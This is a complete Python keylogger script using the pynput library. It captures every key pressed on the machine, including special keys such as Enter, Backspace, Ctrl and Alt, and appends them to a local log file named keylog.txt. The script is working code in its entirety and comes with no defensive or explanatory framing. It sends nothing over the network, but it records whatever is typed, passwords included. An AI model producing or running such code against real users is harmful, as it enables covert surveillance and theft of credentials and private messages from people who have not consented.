import os
from pynput import keyboard

# === Configuration ===
LOG_FILE = "keylog.txt"  # File to save the keystrokes

# === Keylogger Logic ===
def on_press(key):
    """Handle key press events."""
    try:
        # Convert the key to a string
        key_str = str(key).replace("'", "")  # Remove single quotes for readability
        
        # Handle special keys (e.g., space, enter)
        if key == keyboard.Key.space:
            key_str = " "  # Replace space key with a space character
        elif key == keyboard.Key.enter:
            key_str = "\n"  # Replace enter key with a newline
        elif key == keyboard.Key.backspace:
            key_str = "[BACKSPACE]"  # Indicate backspace
        elif key == keyboard.Key.shift:
            key_str = "[SHIFT]"  # Indicate shift
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            key_str = "[CTRL]"  # Indicate control
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            key_str = "[ALT]"  # Indicate alt
        elif key == keyboard.Key.tab:
            key_str = "[TAB]"  # Indicate tab
        elif key == keyboard.Key.esc:
            key_str = "[ESC]"  # Indicate escape

        # Write the key to the log file
        with open(LOG_FILE, "a") as f:  # Append mode
            f.write(key_str)

    except Exception as e:
        print(f"Error handling key press: {e}")

def start_keylogger():
    """Start the keylogger."""
    print("Keylogger started. Press Ctrl+C to stop.")
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()  # Start listening for key presses
    except KeyboardInterrupt:
        print("Keylogger stopped.")

# === Main Function ===
if __name__ == "__main__":
    # Ensure the log file exists
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()

    # Start the keylogger
    start_keylogger()